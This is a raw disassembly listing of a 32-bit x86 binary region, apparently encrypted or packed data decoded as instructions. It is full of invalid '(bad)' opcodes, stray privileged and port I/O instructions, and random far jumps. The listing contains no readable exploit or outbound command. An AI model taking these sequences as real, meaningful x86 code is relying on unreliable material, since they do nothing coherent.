  423b00:	cli    
  423b01:	or     eax,0x7d2475f0
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    eax,0x62000001
  423b0d:	inc    edx
  423b0e:	xchg   ebx,eax
  423b0f:	push   ss
  423b10:	add    BYTE PTR [ebp-0x31defffe],dl
  423b16:	mov    ebp,0xc542e910
  423b1b:	into   
  423b1c:	or     DWORD PTR [ecx-0x56d97129],0x60fe4ce7
  423b26:	shr    DWORD PTR [ecx+ebp*1+0x73],0x13
  423b2b:	scas   al,BYTE PTR es:[edi]
  423b2c:	jecxz  0x423ae2
  423b2e:	popf   
  423b2f:	sahf   
  423b30:	mov    ds:0x1b4a2df1,al
  423b35:	js     0x423ad4
  423b37:	shl    DWORD PTR [edi],1
  423b39:	fld    TBYTE PTR [ecx+0x2e]
  423b3c:	jno    0x423b66
  423b3e:	dec    ebp
  423b3f:	bound  esi,QWORD PTR [edx-0xc63183a]
  423b45:	outs   dx,DWORD PTR ds:[esi]
  423b46:	pop    ebp
  423b47:	inc    edi
  423b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b49:	pop    esp
  423b4a:	cmc    
  423b4b:	jmp    0x423b66
  423b4d:	xor    DWORD PTR [esi-0x2b],esi
  423b50:	jp     0x423bce
  423b52:	arpl   WORD PTR [ecx+0xfa0cde7],ax
  423b58:	sub    DWORD PTR [esi],edi
  423b5a:	add    DWORD PTR [eax+0x22],ebx
  423b5d:	or     BYTE PTR [ebx],bh
  423b5f:	mov    BYTE PTR [ebx-0x37],ah
  423b62:	fmul   DWORD PTR [edi+0xcf82cdd]
  423b68:	pop    eax
  423b69:	xchg   edi,eax
  423b6a:	jmp    0x68d2:0xd99f736a
  423b71:	jbe    0x423bbd
  423b73:	mov    esi,0xc71b82a0
  423b78:	fisub  WORD PTR [ecx]
  423b7a:	pop    ebx
  423b7b:	add    dl,BYTE PTR [ecx+edi*8+0x4b]
  423b7f:	pop    edx
  423b80:	dec    esp
  423b81:	or     al,0x48
  423b83:	fcmovu st,st(6)
  423b85:	mov    al,ds:0xd2b2f4b8
  423b8a:	es out dx,al
  423b8c:	mov    DWORD PTR [edx],esi
  423b8e:	in     eax,0x38
  423b90:	icebp  
  423b91:	into   
  423b92:	xor    BYTE PTR [ecx-0x4a6fbc],bl
  423b98:	mov    edx,0x9917820e
  423b9d:	fidivr WORD PTR [ebx]
  423b9f:	cmp    dh,BYTE PTR [ebx-0x55]
  423ba2:	aas    
  423ba3:	inc    edx
  423ba4:	(bad)  
  423ba5:	mov    ebx,0x2b9a8223
  423baa:	cdq    
  423bab:	cli    
  423bac:	in     al,dx
  423bad:	cmp    eax,0x51cc2275
  423bb2:	mov    ds:0xef61453,al
  423bb7:	fdivr  st,st(6)
  423bb9:	rcl    BYTE PTR [ebp-0x50],0xf5
  423bbd:	cmp    edx,DWORD PTR gs:[edx]
  423bc0:	retf   0x288c
  423bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bc4:	adc    dl,0xbb
  423bc7:	inc    ecx
  423bc8:	daa    
  423bc9:	shr    BYTE PTR [edi],cl
  423bcb:	int    0xe
  423bcd:	out    dx,eax
  423bce:	fwait
  423bcf:	sbb    al,0x6a
  423bd1:	or     al,0xb5
  423bd3:	or     al,0x38
  423bd5:	call   0x17408971
  423bda:	pop    esp
  423bdb:	sbb    eax,0x230fd9b4
  423be0:	jbe    0x423c39
  423be2:	and    bl,BYTE PTR [ebp+0x5d]
  423be5:	test   al,0x4c
  423be7:	dec    edi
  423be8:	push   eax
  423be9:	and    ecx,esp
  423beb:	xchg   edx,eax
  423bec:	and    ah,bl
  423bee:	int    0x67
  423bf0:	or     DWORD PTR [ecx],edx
  423bf2:	outs   dx,BYTE PTR ds:[esi]
  423bf3:	iret   
  423bf4:	not    BYTE PTR [edi-0x11]
  423bf7:	adc    al,0xa0
  423bf9:	inc    eax
  423bfa:	hlt    
  423bfb:	js     0x423b86
  423bfd:	inc    edx
  423bfe:	fcomp  DWORD PTR ds:[edi]
  423c01:	cmp    DWORD PTR [esp+ebx*2],esp
  423c04:	mov    dh,0x95
  423c06:	jge    0x423bb2
  423c08:	or     eax,0x18c993fa
  423c0d:	mov    ch,BYTE PTR [eax+0x2b]
  423c10:	scas   al,BYTE PTR es:[edi]
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x13446617]
  423c81:	inc    edx
  423c82:	cmp    BYTE PTR [edi+0x29],bh
  423c85:	jle    0x423c88
  423c87:	add    BYTE PTR ds:0x91000001,al
  423c8d:	fiadd  DWORD PTR [esi]
  423c8f:	jnp    0x423c20
  423c91:	in     eax,0xe
  423c93:	fcmovne st,st(1)
  423c95:	xor    esp,edi
  423c97:	arpl   bp,di
  423c99:	dec    edi
  423c9a:	fild   WORD PTR [esi+0x2159da5b]
  423ca0:	or     BYTE PTR [eax+ecx*1],ah
  423ca3:	jg     0x423c8e
  423ca5:	push   ss
  423ca6:	sbb    al,0x4b
  423ca8:	inc    esi
  423ca9:	push   cs
  423caa:	xchg   edi,eax
  423cab:	shr    BYTE PTR [edi],1
  423cad:	and    DWORD PTR [edi+0x65],edi
  423cb0:	pop    esp
  423cb1:	dec    ebx
  423cb2:	iret   
  423cb3:	jmp    0x106f:0x130eefa6
  423cba:	mov    edx,0x353e5fc7
  423cbf:	fidiv  DWORD PTR [esi-0x5315ba10]
  423cc5:	push   ecx
  423cc6:	stos   BYTE PTR es:[edi],al
  423cc7:	iret   
  423cc8:	mov    DWORD PTR [esi],esp
  423cca:	push   esi
  423ccb:	fidiv  WORD PTR [ebx+0x7194b411]
  423cd1:	cmp    eax,0x44697436
  423cd6:	loope  0x423c98
  423cd8:	mov    WORD PTR [edx],?
  423cda:	or     al,0x78
  423cdc:	pop    ecx
  423cdd:	mov    eax,0x72312a64
  423ce2:	leave  
  423ce3:	cmp    bh,BYTE PTR [ebx+ebx*8]
  423ce6:	adc    BYTE PTR [ecx-0x6205ed25],0xfd
  423ced:	push   eax
  423cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cef:	xor    ah,0xf
  423cf2:	adc    dh,BYTE PTR [esi+0x65]
  423cf5:	ror    DWORD PTR [ebx],1
  423cf7:	xchg   BYTE PTR [eax+0x79648edc],cl
  423cfd:	cmp    DWORD PTR [edx-0x1],ebx
  423d00:	aaa    
  423d01:	ret    0x1632
  423d04:	dec    edi
  423d05:	sub    eax,DWORD PTR [esi-0x7d4d4c2b]
  423d0b:	push   cs
  423d0c:	(bad)  
  423d0d:	xchg   esp,eax
  423d0e:	push   es
  423d0f:	jle    0x423ccf
  423d11:	fld    QWORD PTR [ebx+0x9e56427]
  423d17:	mov    dh,0x4d
  423d19:	and    BYTE PTR [edi+0x5e],0xd
  423d1d:	jae    0x423cc5
  423d1f:	xor    dh,BYTE PTR [esi+eax*8-0x28c4be74]
  423d26:	outs   dx,DWORD PTR ds:[esi]
  423d27:	inc    ebx
  423d28:	retf   
  423d29:	ror    ah,0xd6
  423d2c:	dec    edx
  423d2e:	mov    cs,esi
  423d30:	push   ds
  423d31:	sbb    dh,BYTE PTR [ebx+ebx*2-0x7d]
  423d35:	repnz scas al,BYTE PTR es:[edi]
  423d37:	mov    fs,edx
  423d39:	aam    0xdd
  423d3b:	jmp    0x423d9a
  423d3d:	dec    eax
  423d3e:	mov    DWORD PTR [edi-0x58],ebx
  423d41:	cmp    al,0xff
  423d43:	das    
  423d44:	(bad)  
  423d45:	fucomp st(3)
  423d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d48:	call   DWORD PTR [eax+0x662e51a0]
  423d4e:	lock popf 
  423d50:	pop    esp
  423d51:	xchg   DWORD PTR [ebp+0x6740b6cc],ecx
  423d57:	retf   0x721f
  423d5a:	je     0x423ce1
  423d5c:	mov    WORD PTR [edi-0xe],?
  423d5f:	cmp    eax,0x5d69819e
  423d64:	int3   
  423d65:	dec    esi
  423d66:	std    
  423d67:	jg     0x423d53
  423d69:	push   ecx
  423d6a:	jns    0x423d35
  423d6c:	jno    0x423d20
  423d6e:	cmp    DWORD PTR [esi-0x16],esp
  423d71:	dec    esi
  423d72:	dec    edx
  423d73:	xlat   BYTE PTR ds:[ebx]
  423d74:	mov    WORD PTR [ecx+0x7b969272],?
  423d7a:	fdiv   QWORD PTR [ebx-0x5b]
  423d7d:	mov    dl,0xaa
  423d7f:	lods   al,BYTE PTR ds:[esi]
  423d80:	leave  
  423d81:	and    DWORD PTR [esi-0x29],eax
  423d84:	jne    0x423db2
  423d86:	pushf  
  423d87:	(bad)
  423d8c:	inc    eax
  423d8d:	(bad)  [ebx-0x1]
  423d90:	add    DWORD PTR [eax],eax
	...
  423df2:	add    BYTE PTR [eax],al
  423df4:	(bad)  
  423df5:	test   BYTE PTR [edi-0x118668f7],0xff
  423dfc:	daa    
  423dfd:	mov    DWORD PTR [eax+0x497f4d2],esp
  423e03:	adc    ebp,DWORD PTR [esi]
  423e05:	jg     0x423e08
  423e07:	add    BYTE PTR ds:0xcd000001,al
  423e0d:	xor    bl,dl
  423e0f:	sub    BYTE PTR [esi+0x5e],bl
  423e12:	pop    ecx
  423e13:	add    DWORD PTR [edi-0x1eaf4a66],edx
  423e19:	popa   
  423e1a:	imul   esp,DWORD PTR [eax-0x6a1059bc],0x4a7b926e
  423e24:	sub    bl,dl
  423e26:	lods   eax,DWORD PTR ds:[esi]
  423e27:	mov    esi,0x85f32f12
  423e2c:	sub    DWORD PTR [edx-0x78408c77],ebp
  423e32:	jmp    0xb659:0x1b25515c
  423e39:	mov    ds:0xaa47eaa5,al
  423e3e:	xor    al,0x95
  423e40:	jo     0x423e2b
  423e42:	adc    ch,BYTE PTR [esi]
  423e44:	jmp    0xaa881e21
  423e49:	push   ebx
  423e4a:	fidivr DWORD PTR [edi+0x35]
  423e4d:	fsubr  DWORD PTR [ecx]
  423e4f:	xor    ebx,ecx
  423e51:	(bad)  
  423e52:	shl    BYTE PTR [ebp-0x1e],cl
  423e55:	and    BYTE PTR [ebx+0xc0ccddd],al
  423e5b:	addr16 out dx,al
  423e5d:	mov    ebx,edi
  423e5f:	xchg   ebx,eax
  423e60:	lods   al,BYTE PTR ds:[esi]
  423e61:	sub    al,0xb6
  423e63:	cld    
  423e64:	push   ss
  423e65:	jecxz  0x423eb1
  423e67:	sahf   
  423e68:	push   esi
  423e69:	dec    ecx
  423e6a:	daa    
  423e6b:	dec    esi
  423e6c:	or     eax,0x6dd8ff7e
  423e71:	loopne 0x423e6f
  423e73:	cmp    ebx,DWORD PTR [ebx+0x48]
  423e76:	mov    edx,0x4002842d
  423e7b:	xor    DWORD PTR [eax-0x1e],0xe6f98817
  423e82:	(bad)  
  423e83:	shl    BYTE PTR [ecx],1
  423e85:	dec    ecx
  423e86:	push   eax
  423e87:	paddq  mm1,QWORD PTR [edi+edi*1+0x6b8c6003]
  423e8f:	dec    eax
  423e90:	mov    edx,0x39cab4a5
  423e95:	xchg   ebp,eax
  423e96:	sbb    BYTE PTR [ebx+0x59],bh
  423e99:	mov    ah,0x42
  423e9b:	mov    ds:0x85d09477,al
  423ea0:	shl    DWORD PTR [eax],0xf8
  423ea3:	and    DWORD PTR [esi],ecx
  423ea5:	pop    eax
  423ea6:	dec    esi
  423ea7:	cli    
  423ea8:	repz scas al,BYTE PTR es:[edi]
  423eaa:	aad    0xc9
  423eac:	adc    ch,ah
  423eae:	mov    bh,0xe4
  423eb0:	out    dx,eax
  423eb1:	pop    ebp
  423eb2:	jmp    0x423e45
  423eb4:	aam    0x95
  423eb6:	push   es
  423eb7:	test   DWORD PTR [edx+0x2be33894],edi
  423ebd:	mov    cl,0xd7
  423ebf:	xchg   edi,eax
  423ec0:	out    dx,al
  423ec1:	loopne 0x423e55
  423ec3:	xchg   esp,eax
  423ec4:	cmp    eax,0x1f43e38c
  423ec9:	mov    dh,0x8e
  423ecb:	and    BYTE PTR [ebx+ecx*1-0x494a81f9],dh
  423ed2:	pop    edx
  423ed3:	nop
  423ed4:	ret    
  423ed5:	inc    esp
  423ed6:	shl    DWORD PTR [eax+0x5c],0xc3
  423eda:	push   edi
  423edb:	leave  
  423edc:	pop    edx
  423edd:	push   ds
  423ede:	dec    eax
  423edf:	mov    ch,0xe
  423ee1:	fstp   QWORD PTR [edi-0x8]
  423ee4:	into   
  423ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ee6:	sub    eax,0xddb8758d
  423eeb:	or     eax,esp
  423eed:	or     eax,0xceaf8c73
  423ef2:	ror    DWORD PTR [edi+0x13],0xfc
  423ef6:	popa   
  423ef7:	adc    DWORD PTR [edi+0x703ad67b],ebp
  423efd:	inc    eax
  423efe:	adc    DWORD PTR [esi+edi*1-0x1586f554],0x693f4ad3
  423f09:	sub    BYTE PTR [edi],bl
  423f0b:	adc    ecx,ecx
  423f0d:	ins    DWORD PTR es:[edi],dx
  423f0e:	or     DWORD PTR [ebx],ecx
  423f10:	mov    BYTE PTR [eax],0x0
	...
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	and    bl,BYTE PTR [edi]
  423f82:	push   ebx
  423f83:	loopne 0x423fb8
  423f85:	add    BYTE PTR [ecx],0x0
  423f88:	add    eax,0x72000001
  423f8d:	pushf  
  423f8e:	dec    ebp
  423f8f:	(bad)
  423f92:	xor    BYTE PTR [edx-0x74231618],bl
  423f98:	push   esi
  423f99:	mov    cl,0x46
  423f9b:	and    eax,0xe82eb96f
  423fa0:	outs   dx,DWORD PTR ds:[esi]
  423fa1:	arpl   WORD PTR [edx],si
  423fa3:	pop    ss
  423fa4:	rol    BYTE PTR ds:0x61897911,1
  423faa:	lds    eax,FWORD PTR [esi+eax*4+0x7d0c90b2]
  423fb1:	nop
  423fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fb3:	push   eax
  423fb4:	push   es
  423fb5:	push   0x48
  423fb7:	jb     0x423fff
  423fb9:	xor    DWORD PTR [edx+0x70212082],ebp
  423fbf:	fidiv  DWORD PTR [ebx+0x15e426d7]
  423fc5:	test   edx,0x9c46c98e
  423fcb:	pop    esi
  423fcc:	ja     0x424024
  423fce:	mov    ah,BYTE PTR [eax-0xe]
  423fd1:	hlt    
  423fd2:	sbb    al,0xaf
  423fd4:	inc    ebx
  423fd5:	leave  
  423fd6:	xor    al,0x3
  423fd8:	popa   
  423fd9:	mov    gs,WORD PTR [edx-0x2c84c7be]
  423fdf:	and    al,BYTE PTR [edx-0x5d]
  423fe2:	call   0x3f9dff43
  423fe7:	xchg   esp,eax
  423fe8:	shl    DWORD PTR [eax-0x4d9ea1fb],cl
  423fee:	and    eax,0xeddd4bbe
  423ff3:	jae    0x42405b
  423ff5:	call   0x3127b772
  423ffa:	(bad)  
  423ffb:	jno    0x423fcd
  423ffd:	mov    esi,ds
  423fff:	or     al,0xcf
  424001:	push   0x1
  424003:	adc    al,ah
  424005:	fsubr  QWORD PTR ds:0xc1db79f8
  42400b:	inc    esp
  42400c:	jecxz  0x42406d
  42400e:	shr    BYTE PTR [edx+0x62adf766],0xc5
  424015:	dec    edx
  424016:	sbb    eax,0xde10c09c
  42401b:	push   0x1864fde6
  424020:	pop    ds
  424021:	push   esi
  424022:	mov    eax,0x9e6855e1
  424027:	mov    ds:0x424464fe,eax
  42402c:	mov    ch,0x47
  42402e:	push   edi
  42402f:	pop    esi
  424030:	inc    ebx
  424031:	ja     0x424071
  424033:	js     0x4240ac
  424035:	outs   dx,DWORD PTR ds:[esi]
  424036:	cmp    DWORD PTR [edx+0x3c57a8bc],0xffffffb2
  42403d:	fs push edi
  42403f:	fwait
  424040:	jb     0x42401c
  424042:	xchg   BYTE PTR [edx*4-0x62b1de67],dh
  424049:	mov    bl,al
  42404b:	mov    ch,0xfa
  42404d:	xor    al,0xa4
  42404f:	cmc    
  424050:	(bad)  
  424051:	jbe    0x423ff2
  424053:	xor    ah,ch
  424055:	xor    BYTE PTR ds:0x1f58616f,0x50
  42405c:	lahf   
  42405d:	inc    ecx
  42405e:	add    DWORD PTR [eax+0x1d7ddfa1],edi
  424064:	rcr    BYTE PTR [edi+ebp*8-0x22bfa25d],cl
  42406b:	jle    0x4240b8
  42406d:	lea    ecx,[edx-0x20]
  424070:	push   0x8d078d73
  424075:	in     al,dx
  424076:	xor    eax,0x3ed0f5cd
  42407b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42407c:	int3   
  42407d:	rol    ebx,cl
  42407f:	aaa    
  424080:	stc    
  424081:	icebp  
  424082:	mov    ah,0x94
  424084:	add    eax,0x21880f4f
  424089:	test   al,0xf6
  42408b:	dec    esp
  42408c:	or     al,0x1b
  42408e:	lea    eax,[edx]
  424090:	mov    eax,ds:0x0
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	xchg   BYTE PTR [ebx],bl
  424102:	ins    BYTE PTR es:[edi],dx
  424103:	dec    edi
  424104:	cmp    BYTE PTR [ecx+0x1050001],al
  42410a:	add    BYTE PTR [eax],al
  42410c:	mov    ebp,0xf599a779
  424111:	jmp    0xf639:0x119363ea
  424118:	mov    eax,0x9dacaa4e
  42411d:	mov    esp,0x216db886
  424122:	mov    al,0xdf
  424124:	xor    ch,ch
  424126:	pop    edi
  424127:	push   esi
  424128:	cmc    
  424129:	sub    dl,BYTE PTR [eax+0x44]
  42412c:	pop    eax
  42412d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42412e:	pop    edi
  42412f:	cdq    
  424130:	push   cs
  424131:	je     0x424135
  424133:	dec    esi
  424134:	sbb    BYTE PTR [eax],ch
  424136:	mov    ?,WORD PTR [ecx+eax*1]
  424139:	shl    DWORD PTR [ecx],0xd7
  42413c:	add    esi,esp
  42413e:	scas   al,BYTE PTR es:[edi]
  42413f:	xor    DWORD PTR [ebp-0x6e],ebx
  424142:	and    al,0x1c
  424144:	ret    
  424145:	pop    edx
  424146:	mov    bl,BYTE PTR [esi+0x12333c38]
  42414c:	mov    al,bl
  42414e:	sahf   
  42414f:	cs (bad) 
  424151:	xchg   ebx,eax
  424152:	das    
  424153:	pop    ds
  424154:	jno    0x424116
  424156:	jg     0x424166
  424158:	pop    esp
  424159:	(bad)  
  42415a:	stos   DWORD PTR es:[edi],eax
  42415b:	sbb    DWORD PTR [esi+ecx*4],ebp
  42415e:	pop    esi
  42415f:	mov    al,0xbf
  424161:	(bad)  
  424162:	mov    edx,0xce8811e9
  424167:	test   al,0xf1
  424169:	push   esp
  42416a:	push   es
  42416b:	xor    DWORD PTR [edi],0x8
  42416e:	push   eax
  42416f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424171:	mov    ?,WORD PTR [edx+0x18218ad3]
  424177:	sahf   
  424178:	test   ebx,0xfb6de713
  42417e:	push   0x2b
  424180:	fnsave [edi+0x1f]
  424183:	fwait
  424184:	shr    BYTE PTR [edi-0x2a9a5497],1
  42418a:	aaa    
  42418b:	pop    ebp
  42418c:	ins    DWORD PTR es:[edi],dx
  42418d:	cld    
  42418e:	pop    esi
  42418f:	shr    edi,0x97
  424192:	mov    al,ah
  424194:	pop    edx
  424195:	retf   0x3776
  424198:	push   es
  424199:	cmp    BYTE PTR [ebp+0x34],0xcf
  42419d:	jecxz  0x424135
  42419f:	mov    es,WORD PTR [edx-0x57]
  4241a2:	outs   dx,DWORD PTR ds:[esi]
  4241a3:	frstor [edx-0x2e9b5ad5]
  4241a9:	mov    DWORD PTR [esi-0x68],esi
  4241ac:	rol    DWORD PTR [ecx+0x26365bff],0xcb
  4241b3:	mov    ch,0x3e
  4241b5:	inc    eax
  4241b6:	cdq    
  4241b7:	jg     0x424210
  4241b9:	jns    0x4241d2
  4241bb:	xlat   BYTE PTR ds:[ebx]
  4241bc:	dec    ebx
  4241bd:	fwait
  4241be:	sub    DWORD PTR [ebx+0x6f],esi
  4241c1:	push   ebp
  4241c2:	dec    edi
  4241c3:	leave  
  4241c4:	xlat   BYTE PTR ds:[ebx]
  4241c5:	jle    0x424152
  4241c7:	or     BYTE PTR [ebp+0x5f],bh
  4241ca:	in     al,0x54
  4241cc:	and    DWORD PTR [eax+0x1dc270c9],edx
  4241d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241d3:	leave  
  4241d4:	(bad)  
  4241d5:	test   edx,esp
  4241d7:	jo     0x4241db
  4241d9:	mov    DWORD PTR [eax],eax
  4241db:	hlt    
  4241dc:	lods   eax,DWORD PTR ds:[esi]
  4241dd:	lods   eax,DWORD PTR ds:[esi]
  4241de:	sub    DWORD PTR [edx],eax
  4241e0:	aam    0xc6
  4241e2:	jns    0x424198
  4241e4:	arpl   WORD PTR [ebp+0x13569866],dx
  4241ea:	dec    edx
  4241eb:	repz in eax,dx
  4241ed:	out    0xa4,eax
  4241ef:	shl    BYTE PTR [edx],1
  4241f1:	mov    esi,0xa48fe8c3
  4241f6:	add    eax,0xd08f7aad
  4241fb:	pop    ecx
  4241fc:	mov    cl,0x7e
  4241fe:	or     eax,0x6dc4de67
  424203:	rcr    esi,cl
  424205:	ins    DWORD PTR es:[edi],dx
  424206:	dec    ecx
  424207:	(bad)  [ecx]
  424209:	xor    ch,BYTE PTR [ebp-0x2d]
  42420c:	pop    ds
  42420d:	fild   QWORD PTR [ebx+0x3b]
  424210:	lock add BYTE PTR [eax],al
	...
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	mov    ds:0x3d58fee8,al
  424285:	add    BYTE PTR [ecx],0x0
  424288:	add    eax,0x6c000001
  42428d:	mov    edi,0x629ae791
  424292:	sub    DWORD PTR [ebx],ebp
  424294:	imul   ebx,DWORD PTR [eax],0x9318b375
  42429a:	jae    0x424313
  42429c:	daa    
  42429d:	add    ecx,DWORD PTR [eax]
  42429f:	int    0x1b
  4242a1:	in     al,0x1
  4242a3:	sbb    DWORD PTR [ebx+0x6f44224a],eax
  4242a9:	imul   ebx,DWORD PTR [ecx],0x827707b9
  4242af:	jmp    0x884f:0x229eb370
  4242b6:	push   cs
  4242b7:	xchg   eax,esi
  4242b9:	add    eax,0x1b82d46f
  4242be:	(bad)  
  4242bf:	neg    DWORD PTR [esi+0x54a8a965]
  4242c5:	mov    eax,ds:0x1e33af39
  4242ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242cb:	pop    esp
  4242cc:	mov    esp,0x9199aa9
  4242d1:	pop    ecx
  4242d2:	add    edi,DWORD PTR [esi+eax*4]
  4242d5:	jns    0x424339
  4242d7:	stc    
  4242d8:	xchg   ecx,eax
  4242d9:	jne    0x4242e1
  4242db:	dec    ebx
  4242dc:	bnd jge 0x4242a7
  4242df:	es test al,0x45
  4242e2:	int3   
  4242e3:	inc    edx
  4242e4:	xor    DWORD PTR [esi],ebx
  4242e6:	adc    al,cl
  4242e8:	dec    esi
  4242e9:	je     0x424305
  4242eb:	jae    0x42432c
  4242ed:	xlat   BYTE PTR ds:[ebx]
  4242ee:	pop    ss
  4242ef:	inc    edi
  4242f0:	stos   DWORD PTR es:[edi],eax
  4242f1:	fadd   DWORD PTR [ecx]
  4242f3:	ja     0x424358
  4242f5:	popa   
  4242f6:	inc    ebp
  4242f7:	inc    eax
  4242f8:	inc    esi
  4242f9:	cmp    al,0x38
  4242fb:	mov    BYTE PTR [edi+0x26cf8320],al
  424301:	aad    0x1f
  424303:	jmp    0x4242e5
  424305:	sahf   
  424306:	arpl   WORD PTR [ecx-0x10],bp
  424309:	hlt    
  42430a:	call   0x3dbf:0x7808076e
  424311:	fwait
  424312:	push   eax
  424313:	xor    eax,DWORD PTR [edi-0x4e]
  424316:	mov    al,ds:0xa8e1e6a3
  42431b:	push   ebp
  42431c:	sub    dh,BYTE PTR [eax-0x6d748e83]
  424322:	xsha1  (bad)
  424323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424324:	into   
  424325:	pop    esp
  424326:	jmp    0x359c:0xdacbb00c
  42432d:	push   eax
  42432e:	inc    esp
  42432f:	jae    0x4242c7
  424331:	in     al,dx
  424332:	sahf   
  424333:	push   edx
  424334:	out    0xb7,al
  424336:	add    ebp,edi
  424338:	inc    edi
  424339:	fwait
  42433a:	sbb    ah,BYTE PTR [ecx-0x21]
  42433d:	aaa    
  42433e:	in     al,0xca
  424340:	inc    eax
  424341:	loopne 0x424307
  424343:	int    0x71
  424345:	push   esi
  424346:	jp     0x4242d0
  424348:	inc    eax
  424349:	(bad)  
  42434b:	mov    bh,0x91
  42434d:	jmp    0x8344e295
  424352:	and    DWORD PTR [eax-0x10],ebx
  424355:	cmp    al,0x3f
  424357:	rol    DWORD PTR [edx],1
  424359:	pop    eax
  42435a:	mov    dl,0x1f
  42435c:	ss int 0xce
  42435f:	shr    BYTE PTR [eax+0x76],cl
  424362:	retf   0x92a8
  424365:	cwde   
  424366:	push   cs
  424367:	lock dec esi
  424369:	pop    ecx
  42436a:	mov    ds:0xe6c3ee3f,eax
  42436f:	jb     0x424332
  424371:	clc    
  424372:	or     ah,BYTE PTR [esi-0x29]
  424375:	loope  0x4243e8
  424377:	jg     0x424320
  424379:	sub    al,0xe9
  42437b:	mov    ebp,0xde6a272b
  424380:	xchg   ebx,eax
  424381:	nop
  424382:	xor    DWORD PTR [ebp+ebx*2-0x3f13ac01],ecx
  424389:	fcomp  QWORD PTR [esi-0x53c1b2a7]
  42438f:	fbld   TBYTE PTR [eax]
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x42443b
  424401:	test   BYTE PTR [eax],bl
  424403:	inc    esp
  424404:	inc    edx
  424405:	add    DWORD PTR [ecx],0x0
  424408:	add    eax,0x9b000001
  42440d:	(bad)
  424411:	loopne 0x42439a
  424413:	test   eax,0xe4180671
  424418:	mov    bl,ch
  42441a:	es adc eax,ecx
  42441d:	cli    
  42441e:	dec    ebx
  42441f:	fsubr  st,st(7)
  424421:	cdq    
  424422:	aas    
  424423:	inc    esp
  424424:	mov    esi,0xd21d8f9b
  424429:	sbb    eax,0xcb7aa6a3
  42442e:	xor    BYTE PTR [esi+0xdd3299f],dh
  424434:	rcl    BYTE PTR [esi],cl
  424436:	inc    edi
  424437:	adc    eax,0x7819472b
  42443c:	pop    ebp
  42443d:	push   ebx
  42443e:	dec    edx
  42443f:	les    ebx,FWORD PTR [ecx-0x3d]
  424442:	and    DWORD PTR [ecx],eax
  424444:	xchg   esi,eax
  424445:	pop    eax
  424446:	sahf   
  424447:	sub    BYTE PTR [edi],al
  424449:	xchg   ecx,eax
  42444a:	clc    
  42444b:	mov    ebp,0xf1a5bc8d
  424450:	mov    edi,0x1a6939c7
  424455:	out    0x19,eax
  424457:	(bad)  
  424458:	mov    ds:0xc4116a9a,al
  42445d:	rcr    BYTE PTR [eax-0x4c84d08c],cl
  424463:	test   eax,0xc298bc3
  424468:	cld    
  424469:	daa    
  42446a:	lods   al,BYTE PTR ds:[esi]
  42446b:	mov    fs,WORD PTR [ebp+edi*1+0x69]
  42446f:	test   BYTE PTR [ecx+0x760abe0b],0x95
  424476:	mov    bl,0x12
  424478:	popa   
  424479:	loope  0x42445a
  42447b:	in     al,dx
  42447c:	push   0x7424a35b
  424481:	(bad)  
  424482:	(bad)  
  424484:	call   0x7cc1f40a
  424489:	mov    al,ds:0x4c01d84a
  42448e:	mov    ebp,0x386ba4e4
  424493:	add    ebp,edi
  424495:	mov    bh,0x13
  424497:	icebp  
  424498:	call   0x6f31ab7c
  42449d:	jbe    0x424474
  42449f:	imul   eax,DWORD PTR [edi],0xffffffd6
  4244a2:	aad    0x6e
  4244a4:	dec    ebx
  4244a5:	fidiv  WORD PTR es:[edi+0x27]
  4244a9:	push   ss
  4244aa:	push   cs
  4244ab:	dec    ebx
  4244ac:	dec    ecx
  4244ad:	mov    bl,0xa2
  4244af:	jle    0x424521
  4244b1:	sahf   
  4244b2:	push   esi
  4244b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244b4:	xchg   DWORD PTR [esi-0x15b5faef],ecx
  4244ba:	dec    ebx
  4244bb:	aam    0x1c
  4244bd:	ror    edi,1
  4244bf:	inc    ebx
  4244c0:	jns    0x424521
  4244c2:	sub    eax,0x9b0d5507
  4244c7:	pusha  
  4244c8:	lods   al,BYTE PTR ds:[esi]
  4244c9:	out    0xf5,al
  4244cb:	sbb    esp,DWORD PTR [eax]
  4244cd:	lock cmp bl,al
  4244d0:	push   ebx
  4244d1:	cdq    
  4244d2:	jae    0x42445e
  4244d4:	mov    dh,0x11
  4244d6:	or     eax,0xbcf6721b
  4244db:	lahf   
  4244dc:	sub    DWORD PTR [eax-0x31e50b20],edi
  4244e2:	mov    al,0xc
  4244e4:	dec    ebp
  4244e5:	mov    ebp,0x136ea3d0
  4244ea:	mov    esp,0xdaaa38a0
  4244ef:	sbb    eax,0x5f9c3e82
  4244f4:	push   ecx
  4244f5:	loop   0x4244f6
  4244f7:	xor    esi,edi
  4244f9:	or     edx,eax
  4244fb:	mov    cs,WORD PTR [edx-0x1a]
  4244fe:	jne    0x42448a
  424500:	sti    
  424501:	mov    al,ds:0x7545621e
  424506:	hlt    
